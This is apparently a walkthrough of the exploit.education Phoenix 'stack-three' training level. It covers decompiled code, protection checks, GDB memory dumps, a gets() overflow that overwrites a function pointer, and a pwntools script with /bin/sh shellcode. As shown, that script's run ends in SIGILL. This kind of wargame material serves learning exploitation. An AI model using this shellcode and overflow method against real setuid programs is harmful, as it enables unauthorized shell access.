# &#35; stack-3

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  char local_54 [64];
  code *local_14;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/stack-three, brought to you by https://exploit.education");
  local_14 = (code *)0x0;
  gets(local_54);
  if (local_14 == (code *)0x0) {
    puts("function pointer remains unmodified :~( better luck next time!");
  }
  else {
    printf("calling function pointer @ %p\n",local_14);
    fflush(stdout);
    (*local_14)();
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-three
/opt/phoenix/i486/stack-three: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
  nterpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-three
[*] '/opt/phoenix/i486/stack-three'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```



#### &#42; how it work
#### buffer overflow on gets()
```bash
$ /opt/phoenix/i486/stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
aaaa
function pointer remains unmodified :~( better luck next time!

```


#### &#42; vulnerable point
```bash
#### we can overwrite local_14 variable using gets(local_54)
```


#### &#42; stack structure
#### local_54[64] + local_14[4] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-three -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-three...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048555 <+0>:	lea    ecx,[esp+0x4]
   0x08048559 <+4>:	and    esp,0xfffffff0
   0x0804855c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804855f <+10>:	push   ebp
   0x08048560 <+11>:	mov    ebp,esp
   0x08048562 <+13>:	push   ecx
   0x08048563 <+14>:	sub    esp,0x54
   0x08048566 <+17>:	sub    esp,0xc
   0x08048569 <+20>:	push   0x8048664
   0x0804856e <+25>:	call   0x8048360 <puts@plt>
   0x08048573 <+30>:	add    esp,0x10
   0x08048576 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804857d <+40>:	sub    esp,0xc
   0x08048580 <+43>:	lea    eax,[ebp-0x4c]
   0x08048583 <+46>:	push   eax
   0x08048584 <+47>:	call   0x8048350 <gets@plt>
   0x08048589 <+52>:	add    esp,0x10
   0x0804858c <+55>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804858f <+58>:	test   eax,eax
   0x08048591 <+60>:	je     0x80485bf <main+106>
   0x08048593 <+62>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048596 <+65>:	sub    esp,0x8
   0x08048599 <+68>:	push   eax
   0x0804859a <+69>:	push   0x80486b0
   0x0804859f <+74>:	call   0x8048340 <printf@plt>
   0x080485a4 <+79>:	add    esp,0x10
   0x080485a7 <+82>:	mov    eax,ds:0x80498a4
   0x080485ac <+87>:	sub    esp,0xc
   0x080485af <+90>:	push   eax
   0x080485b0 <+91>:	call   0x8048370 <fflush@plt>
   0x080485b5 <+96>:	add    esp,0x10
   0x080485b8 <+99>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485bb <+102>:	call   eax
   0x080485bd <+104>:	jmp    0x80485cf <main+122>
   0x080485bf <+106>:	sub    esp,0xc
   0x080485c2 <+109>:	push   0x80486d0
   0x080485c7 <+114>:	call   0x8048360 <puts@plt>
   0x080485cc <+119>:	add    esp,0x10
   0x080485cf <+122>:	sub    esp,0xc
   0x080485d2 <+125>:	push   0x0
   0x080485d4 <+127>:	call   0x8048380 <exit@plt>
End of assembler dump.
gef>


gef> x/24xw $ebp-0x4c       => local_54 [64]
0xffffd68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd69c:	0x41414141	0x41414141	0x00414141	0x00000000
0xffffd6ac:	0x080482ec	0x00000000	0x00000000	0x00000000
0xffffd6bc:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6cc:	0x00000000	0x00000000	0xffffd6f0	0xffffd76c
0xffffd6dc:	0xf7f8f654	0xffffd764	0x00000001	0xffffd76c
gef> x/4xw $ebp-0xc        => local_14
0xffffd6cc:	0x00000000	0x00000000	0xffffd6f0	0xffffd76c
gef>
gef> p/d 0xffffd6cc-0xffffd68c
$1 = 64

```

#### &#42; payload
```bash
#### local_54[64] + local_14[4] + sfp[4] + ret[4]

```

#### &#42; exploit code
```bash
$ (python -c 'print("A"*64+"B")'; cat) | /opt/phoenix/i486/stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x42

Segmentation fault
$


$ gdb /opt/phoenix/i486/stack-three -q
^[[AGEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-three...(no debugging symbols found)...done.
gef> b *0x08048576
Breakpoint 1 at 0x8048576
gef> r < <(python -c 'print("A"*64+"B")')
gef> x/24xw 0xffffd68c
0xffffd68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6ac:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6cc:	0x00000042	0x00000000	0xffffd6f0	0xffffd76c
0xffffd6dc:	0xf7f8f654	0xffffd764	0x00000001	0xffffd76c
gef>



$ cat exp_stack3.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/stack-three"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
print(len(shellcode))

payload  = b""
payload += b"\x90"*31
payload += shellcode
payload += b"A"*10
payload += p32(0xffffd69c)
print(len(payload))

conn = process(filename)
print( conn.recvline() )
conn.send(payload)

with open("payload", "wb") as fd:
    fd.write(payload)

conn.interactive()


$ python exp_stack3.py
23
68
[+] Starting local process '/opt/phoenix/i486/stack-three': pid 1120
Welcome to phoenix/stack-three, brought to you by https://exploit.education

[*] Switching to interactive mode
$
calling function pointer @ 0xffffd69c
[*] Process '/opt/phoenix/i486/stack-three' stopped with exit code -4 (SIGILL) (pid 1120)
[*] Got EOF while reading in interactive
$
[*] Got EOF while sending in interactive


```


